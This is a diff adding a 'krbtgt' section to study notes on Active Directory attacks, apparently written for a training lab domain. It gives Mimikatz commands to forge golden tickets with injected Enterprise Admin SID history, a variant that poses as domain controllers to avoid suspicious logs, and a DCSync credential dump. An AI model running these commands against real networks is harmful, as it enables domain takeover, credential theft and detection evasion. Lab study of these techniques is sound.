@@ -3,6 +3,7 @@
 - [Cross Domain Attacks - Forest Root - Trust Key & krbtgt](#cross-domain-attacks---forest-root---trust-key--krbtgt)
   - [Cross Domain Attacks - Forest Root](#cross-domain-attacks---forest-root)
   - [Trust Key](#trust-key)
+  - [krbtgt](#krbtgt)
 
 ---
 
@@ -119,5 +120,46 @@ Alternatively, we can use `Rubeus.exe`:
 ls \\techcorp-dc.techcorp.local\c$
 ```
 
+<br/>
+
 ---
+
+## krbtgt
+
+We will abuse SID history once again:
+
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"'
+```
+
+- In the above command, the mimkatz option `/sids` is forcefully setting the SID History for the Enterprise Admin group for `us.techcorp.local` that is the Forest Enterprise Admin Group.
+
+<br/>
+
+We can now access techcorp-dc as Administrator:
+
+```
+ls \\techcorp-dc.techcorp.local\C$
+```
+
+```
+Enter-PSSession techcorp-dc.techcorp.local
+```
+
+<br/>
+
+To avoid suspicious logs, we can make use of the **Domain Controllers group**:
+
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:us-dc$ /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:516 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9 /ptt"'
+```
+
+- Domain Controllers: `S-1-5-21-2781415573-3701854478-2406986946-516`
+- Enterprise Domain Controller: `S-1-5-9`
+
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local"'
+```
+
+<br/>
 
